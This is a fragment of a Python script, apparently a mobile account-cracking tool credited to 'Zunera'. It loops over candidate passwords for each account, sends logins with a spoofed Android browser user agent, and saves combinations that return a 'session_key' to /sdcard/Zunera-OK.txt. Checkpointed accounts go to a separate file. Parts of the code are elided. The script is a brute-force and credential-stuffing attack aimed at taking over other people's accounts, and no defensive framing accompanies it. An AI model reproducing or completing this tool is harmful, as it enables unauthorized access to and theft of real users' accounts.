...
╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    
\033[1;93m=================================
\033[1;97m Owner  : Zunera :/
\033[1;97m GitHub : Zuners-408 :/
...
def method():
    ...
    print(f"{oo('•')}/sdcard/Zunera-OK.txt")
    print('\033[1;93m='*25)
    print()
    ...
    def start(user):
     try:
        ...
        for pword in totalpass:              
            heads ="Mozilla/5.0 (Linux; Android 8.1.0; vivo 1823 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/7.14.4.0"
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                ...
                open('/sdcard/Zunera-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                cpacc.append(acc)
                open('/sdcard/Zunera-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
